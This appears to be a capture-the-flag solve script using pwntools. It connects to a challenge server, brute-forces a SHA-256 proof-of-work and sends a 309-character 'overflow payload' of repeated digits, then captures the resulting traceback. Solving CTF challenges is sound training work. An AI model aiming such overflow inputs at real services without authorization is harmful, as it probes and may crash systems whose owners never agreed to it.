from pwn import *
import hashlib
import re

HOST = "challs.scriptsorcerers.xyz"
PORT = 10244  # ganti sesuai port instance aktif

context.log_level = "debug"

def solve_pow(io):
    data = io.recvuntil(b"???: ")
    print(data.decode(errors="replace"), end="")

    m = re.search(
        rb"sha256\(([^ ]+) \+ \?\?\?\) == 0+\((\d+) leading zero bits\)",
        data
    )
    if not m:
        raise SystemExit("POW regex gagal")

    prefix = m.group(1)
    bits = int(m.group(2))

    x = 0
    while True:
        guess = str(x).encode()
        h = hashlib.sha256(prefix + guess).digest()
        if int.from_bytes(h, "big") >> (256 - bits) == 0:
            print(f"[+] pow = {guess.decode()}")
            io.sendline(guess)
            return
        x += 1

io = remote(HOST, PORT)
solve_pow(io)

print(io.recvrepeat(1).decode(errors="replace"), end="")

payload = "6" * 309
print(f"[+] sending overflow payload len={len(payload)}")
io.sendline(payload.encode())

# jangan terlalu pendek, tunggu traceback
out = io.recvall(timeout=15)
print("RAW:", repr(out))
print(out.decode(errors="replace"))
